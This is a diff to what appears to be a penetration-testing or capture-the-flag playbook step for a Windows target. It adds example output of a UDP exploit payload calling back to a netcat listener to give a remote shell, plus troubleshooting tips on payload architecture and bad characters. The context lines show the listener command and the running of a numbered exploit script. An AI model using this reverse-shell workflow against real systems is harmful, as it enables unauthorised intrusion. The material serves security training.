@@ -36,6 +36,15 @@ nc -lvnp $ListenPort
 cd $BoxDir && python2 36025.py
 ```
 
+## Example output
+
+    [*] Sending UDP payload to target:$ExploitPort
+    [*] Waiting for callback on $LocalIP:$ListenPort
+    Connection received from target
+    whoami
+
+Focus on the target service receiving the packet and the callback identity. A PoC success message without a shell is only delivery evidence. If the service crashes but no callback arrives, keep the offset and architecture fixed while checking the listener, UDP port, x86 payload, and bad characters one at a time.
+
 ## What did you get?
 
 - [ ] A shell connects back → **Run `whoami` in the callback to confirm the identity, then go to Step 27 · [[Windows - Shell Received]]**
